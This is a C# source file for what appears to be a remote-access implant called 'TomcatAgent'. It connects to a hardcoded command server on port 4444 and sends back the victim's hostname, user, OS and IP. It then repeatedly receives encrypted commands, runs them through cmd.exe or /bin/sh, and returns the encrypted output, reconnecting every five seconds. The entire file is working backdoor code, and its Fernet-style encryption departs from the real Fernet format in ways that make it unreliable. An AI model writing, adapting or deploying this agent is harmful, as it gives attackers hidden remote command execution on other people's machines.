using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Linq;

class TomcatAgent
{
    private const string SERVER_HOST = "0.0.0.0";
    private const int SERVER_PORT = 4444;
    private static byte[] key;

    static void Main(string[] args)
    {
        while (true)
        {
            try
            {
                ConnectToServer();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error: {e.Message}");
            }

            Console.WriteLine("[*] Reconnecting in 5 seconds...");
            System.Threading.Thread.Sleep(5000);
        }
    }

    static string GetLocalIP()
    {
        try
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 80);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                return endPoint.Address.ToString();
            }
        }
        catch
        {
            return "N/A";
        }
    }

    static string FernetDecrypt(byte[] token, byte[] key)
    {
        try
        {
            byte[] decoded = Convert.FromBase64String(Encoding.UTF8.GetString(token));

            if (decoded.Length < 57)
                return null;

            byte version = decoded[0];
            if (version != 0x80)
                return null;

            byte[] iv = new byte[16];
            Array.Copy(decoded, 9, iv, 0, 16);

            byte[] ciphertext = new byte[decoded.Length - 57];
            Array.Copy(decoded, 25, ciphertext, 0, ciphertext.Length);

            byte[] receivedHMAC = new byte[32];
            Array.Copy(decoded, decoded.Length - 32, receivedHMAC, 0, 32);

            byte[] signingKey = SHA256.Create().ComputeHash(Concat(key, Encoding.UTF8.GetBytes("signing")));
            Array.Resize(ref signingKey, 32);

            byte[] encryptionKey = SHA256.Create().ComputeHash(Concat(key, Encoding.UTF8.GetBytes("encryption")));
            Array.Resize(ref encryptionKey, 32);

            using (HMACSHA256 hmac = new HMACSHA256(signingKey))
            {
                byte[] payloadToVerify = new byte[decoded.Length - 32];
                Array.Copy(decoded, 0, payloadToVerify, 0, payloadToVerify.Length);

                byte[] computedHMAC = hmac.ComputeHash(payloadToVerify);

                if (!computedHMAC.SequenceEqual(receivedHMAC))
                    return null;
            }

            using (Aes aes = Aes.Create())
            {
                aes.Key = encryptionKey.Take(16).ToArray();
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    byte[] plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
                    return Encoding.UTF8.GetString(plaintext);
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"[-] Decrypt error: {e.Message}");
            return null;
        }
    }

    static byte[] FernetEncrypt(string data, byte[] key)
    {
        try
        {
            byte version = 0x80;
            long timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();

            byte[] signingKey = SHA256.Create().ComputeHash(Concat(key, Encoding.UTF8.GetBytes("signing")));
            Array.Resize(ref signingKey, 32);

            byte[] encryptionKey = SHA256.Create().ComputeHash(Concat(key, Encoding.UTF8.GetBytes("encryption")));
            Array.Resize(ref encryptionKey, 32);

            byte[] iv = new byte[16];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(iv);
            }

            byte[] ciphertext;
            using (Aes aes = Aes.Create())
            {
                aes.Key = encryptionKey.Take(16).ToArray();
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform encryptor = aes.CreateEncryptor())
                {
                    byte[] plaintextBytes = Encoding.UTF8.GetBytes(data);
                    ciphertext = encryptor.TransformFinalBlock(plaintextBytes, 0, plaintextBytes.Length);
                }
            }

            byte[] timestampBytes = BitConverter.GetBytes(timestamp);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(timestampBytes);

            byte[] payload = Concat(new byte[] { version }, timestampBytes, iv, ciphertext);

            using (HMACSHA256 hmac = new HMACSHA256(signingKey))
            {
                byte[] hmacDigest = hmac.ComputeHash(payload);
                byte[] token = Concat(payload, hmacDigest);
                return Encoding.UTF8.GetBytes(Convert.ToBase64String(token));
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"[-] Encrypt error: {e.Message}");
            return null;
        }
    }

    static byte[] Concat(params byte[][] arrays)
    {
        int totalLength = arrays.Sum(a => a.Length);
        byte[] result = new byte[totalLength];
        int offset = 0;
        foreach (byte[] array in arrays)
        {
            Buffer.BlockCopy(array, 0, result, offset, array.Length);
            offset += array.Length;
        }
        return result;
    }

    static string ExecuteCommand(string command, string hostname, string user, string os, string arch, string agentIP)
    {
        if (command == "SYSINFO")
        {
            return $"OS: {os}\nHostname: {hostname}\nUser: {user}\nArch: {arch}\nAgent IP: {agentIP}\n.NET Version: {Environment.Version}\nCurrent Dir: {Directory.GetCurrentDirectory()}";
        }
        else if (command == "SCREENSHOT")
        {
            return "ERROR: Screenshot not supported in C# agent";
        }
        else if (command.ToLower() == "exit" || command.ToLower() == "quit" || command.ToLower() == "disconnect")
        {
            return "Agent disconnecting...";
        }

        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = os.Contains("Windows") ? "cmd.exe" : "/bin/sh";
            psi.Arguments = os.Contains("Windows") ? $"/c {command}" : $"-c \"{command}\"";
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                string result = output + error;
                return string.IsNullOrEmpty(result) ? "Command executed (no output)" : result;
            }
        }
        catch (Exception e)
        {
            return $"ERROR: {e.Message}";
        }
    }

    static void ConnectToServer()
    {
        Console.WriteLine($"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}");

        using (TcpClient client = new TcpClient())
        {
            client.Connect(SERVER_HOST, SERVER_PORT);

            Console.WriteLine("[+] Connected!");

            NetworkStream stream = client.GetStream();

            byte[] keyBuffer = new byte[1024];
            int keyLen = stream.Read(keyBuffer, 0, keyBuffer.Length);

            key = new byte[keyLen];
            Array.Copy(keyBuffer, 0, key, 0, keyLen);

            key = Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(key).Trim());

            Console.WriteLine($"[+] Key received ({key.Length} bytes)");

            string hostname = Dns.GetHostName();
            string user = Environment.UserName;
            string os = Environment.OSVersion.ToString();
            string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
            string agentIP = GetLocalIP();

            string info = $"{{\"os\":\"{os}\",\"hostname\":\"{hostname}\",\"user\":\"{user}\",\"architecture\":\"{arch}\",\"agentIP\":\"{agentIP}\",\"pythonVersion\":\".NET-{Environment.Version}\"}}";

            byte[] infoBytes = Encoding.UTF8.GetBytes(info);
            stream.Write(infoBytes, 0, infoBytes.Length);
            stream.Flush();
            System.Threading.Thread.Sleep(500);

            Console.WriteLine("[+] Handshake complete");

            stream.ReadTimeout = 300000;

            while (true)
            {
                byte[] buffer = new byte[8192];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);

                if (bytesRead == 0)
                {
                    Console.WriteLine("[-] Connection closed by server");
                    break;
                }

                byte[] encryptedCmd = new byte[bytesRead];
                Array.Copy(buffer, 0, encryptedCmd, 0, bytesRead);

                string command = FernetDecrypt(encryptedCmd, key);

                if (command == null)
                {
                    Console.WriteLine("[-] Failed to decrypt command");
                    continue;
                }

                string displayCmd = command.Length > 50 ? command.Substring(0, 50) + "..." : command;
                Console.WriteLine($"[+] Command received: {displayCmd}");

                string output = ExecuteCommand(command, hostname, user, os, arch, agentIP);

                if (output.Length > 1000000)
                {
                    output = output.Substring(0, 1000000) + "\n...[OUTPUT TRUNCATED - TOO LARGE]";
                }

                byte[] encryptedOutput = FernetEncrypt(output, key);

                if (encryptedOutput == null)
                {
                    Console.WriteLine("[-] Failed to encrypt output");
                    continue;
                }

                stream.Write(encryptedOutput, 0, encryptedOutput.Length);
                stream.Write(Encoding.UTF8.GetBytes("<END>"), 0, 5);
                stream.Flush();

                Console.WriteLine($"[+] Response sent ({encryptedOutput.Length} bytes)");

                if (command.ToLower() == "exit" || command.ToLower() == "quit" || command.ToLower() == "disconnect")
                {
                    break;
                }
            }

            Console.WriteLine("[*] Disconnected");
        }
    }
}